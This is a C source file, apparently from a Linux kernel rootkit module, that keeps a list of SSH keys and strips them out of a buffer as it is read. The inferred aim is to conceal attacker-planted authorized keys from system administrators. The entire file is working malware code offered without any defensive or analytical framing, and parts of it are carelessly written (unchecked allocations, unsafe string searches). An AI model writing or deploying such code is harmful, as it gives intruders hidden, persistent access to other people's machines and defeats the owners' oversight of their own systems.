#include "ssh_keys_hiding.h"

#include <linux/slab.h>
#include <linux/uaccess.h>

#include "consts.h"

LIST_HEAD(hidden_keys);

int remove_hidden_keys(char* buffer, size_t len) {
    SshKey* ssh_key;
    SshKey* temp_ssh_key;
    char* start_of_the_key;
    char* keys_without_the_hidden;
    size_t i = 0;
    size_t j = 0;
    size_t full_length = len;
    list_for_each_entry_safe(ssh_key, temp_ssh_key, &hidden_keys, list_node) {
        start_of_the_key = strstr(buffer, ssh_key->key);
        if (NULL == start_of_the_key) {
            continue;
        }
        memset(start_of_the_key, 0, ssh_key->len);
        len -= ssh_key->len;
    }
    keys_without_the_hidden = kmalloc(len, GFP_KERNEL);
    memset(keys_without_the_hidden, 0, len);
    for (; i < full_length; ++i) {
        if (0 == buffer[i]) {
            continue;
        }
        keys_without_the_hidden[j] = buffer[i];
        j++;
    }
    memcpy(buffer, keys_without_the_hidden, len);
    kfree(keys_without_the_hidden);
    return len;
}

int hide_key(const char __user* key, size_t len) {
    int ret_val;
    SshKey* ssh_key;
    char* key_copy = kmalloc(len, GFP_KERNEL);
    memset(key_copy, 0, len);
    ret_val = copy_from_user(key_copy, key, len);
    if (0 != ret_val) {
        kfree(key_copy);
        return COPY_FROM_USER_FAILED;
    }
    ssh_key = (SshKey*)kmalloc(sizeof(SshKey), GFP_KERNEL);
    ssh_key->key = key_copy;
    ssh_key->len = len;
    list_add_tail(&ssh_key->list_node, &hidden_keys);
    return SUCCESS;
}